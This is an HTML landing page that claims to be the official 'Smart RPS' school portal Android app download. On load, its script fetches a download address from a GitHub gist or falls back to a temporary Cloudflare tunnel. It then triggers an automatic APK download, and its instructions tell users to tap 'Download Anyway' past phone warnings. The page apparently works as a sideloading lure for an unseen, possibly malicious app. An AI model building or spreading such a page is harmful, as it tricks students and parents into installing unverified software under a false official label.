<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart RPS - Download Mobile App</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 50%, #0f172a 100%);
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 24px 16px;
        }
        .card {
            max-width: 440px;
            width: 100%;
            background: rgba(30, 41, 59, 0.85);
            backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 24px;
            padding: 36px 24px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }
        .icon {
            width: 72px;
            height: 72px;
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            border-radius: 18px;
            margin: 0 auto 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
        }
        .icon svg { fill: white; width: 38px; height: 38px; }
        h1 { font-size: 22px; font-weight: 700; margin-bottom: 6px; }
        .sub { font-size: 14px; color: #94a3b8; margin-bottom: 24px; line-height: 1.4; }
        .status-badge {
            background: rgba(15, 23, 42, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 14px;
            padding: 14px;
            margin-bottom: 22px;
            font-size: 13px;
            color: #10b981;
            font-weight: 600;
        }
        .btn-dl {
            display: block;
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #2563eb, #7c3aed);
            color: white;
            font-weight: 700;
            font-size: 16px;
            text-decoration: none;
            border-radius: 14px;
            box-shadow: 0 10px 24px rgba(37, 99, 235, 0.35);
            transition: all 0.2s;
            margin-bottom: 22px;
        }
        .btn-dl:hover { transform: translateY(-2px); box-shadow: 0 14px 28px rgba(37, 99, 235, 0.5); }
        .guide {
            text-align: left;
            background: rgba(255, 255, 255, 0.04);
            border-radius: 14px;
            padding: 16px;
            font-size: 12px;
            color: #94a3b8;
            line-height: 1.6;
        }
        .guide b { color: #f1f5f9; }
        .guide ol { padding-left: 18px; margin-top: 6px; }
        .guide li { margin-bottom: 4px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">
            <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
        </div>
        <h1>Smart RPS Mobile App</h1>
        <p class="sub">Official School Portal (Android APK)</p>

        <div class="status-badge" id="status">Connecting to cloud server...</div>

        <a href="#" id="dl-btn" class="btn-dl" style="display:none;">Download APK (v1.1.20)</a>

        <div class="guide">
            <b>Installation Steps:</b>
            <ol>
                <li>Tap <b>Download APK</b> if download doesn't start automatically.</li>
                <li>Tap <b>Download Anyway</b> if prompted by your phone.</li>
                <li>Open the downloaded APK and tap <b>Install</b>.</li>
            </ol>
        </div>
    </div>

    <script>
        const GIST_URL = 'https://gist.githubusercontent.com/Blinders7/2796c813b75aeb01a662670a69e268df/raw?t=' + Date.now();
        const FALLBACK_URL = 'https://sides-ice-cars-newark.trycloudflare.com';

        function startDownload(baseUrl) {
            const clean = baseUrl.trim().replace(/\/$/, '');
            const dl = clean + '/download/app.apk';
            document.getElementById('status').innerHTML = '&#10003; Server Online (v1.1.20)';
            const btn = document.getElementById('dl-btn');
            btn.href = dl;
            btn.style.display = 'block';
            setTimeout(() => { window.location.href = dl; }, 700);
        }

        fetch(GIST_URL)
            .then(r => r.text())
            .then(txt => {
                const u = txt.trim();
                if (u.startsWith('http://') || u.startsWith('https://')) {
                    startDownload(u);
                } else {
                    startDownload(FALLBACK_URL);
                }
            })
            .catch(() => {
                startDownload(FALLBACK_URL);
            });
    </script>
</body>
</html>
